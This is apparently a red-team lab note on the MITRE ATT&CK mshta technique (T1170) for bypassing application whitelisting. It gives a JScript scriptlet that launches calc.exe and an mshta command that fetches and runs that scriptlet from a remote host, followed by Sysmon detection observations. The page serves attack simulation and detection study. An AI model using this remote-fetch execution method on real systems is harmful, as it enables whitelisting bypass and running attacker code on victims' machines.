---
description: Application whitelist bypass technique
---

# T1170: MSHTA Code Execution

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1170\",\"type\":\"link\",\"title\":\"Mshta - ATT&CK for Enterprise\"}" %}

## Code

{% code-tabs %}
{% code-tabs-item title="http://10.0.0.5/m.sct" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Execution

```bash
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```

## Observations

As expected, calc is spawned by mshta. Also, mhsta and cmd exit almost immediately after invoking the calc.exe.

![](../.gitbook/assets/mshta-calc.png)

Look at sysmon for mshta establishing network connections:

![](../.gitbook/assets/mshta-connection.png)

Also, suspicious commandlines:

![](../.gitbook/assets/mshta-commandline.png)



